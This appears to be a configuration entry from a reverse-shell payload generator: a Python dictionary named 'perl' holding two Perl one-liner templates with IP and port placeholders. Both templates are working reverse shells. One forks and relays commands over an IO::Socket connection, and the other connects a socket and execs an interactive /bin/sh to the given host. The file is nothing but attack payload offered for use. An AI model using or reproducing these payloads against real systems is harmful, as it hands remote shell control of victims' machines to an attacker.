conf = {
    "name": "perl",
    "templates": [
        "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"%IP%:%PORT%\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
        "perl -e 'use Socket;$i=\"%IP%\";$p=%PORT%;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
    ]
}
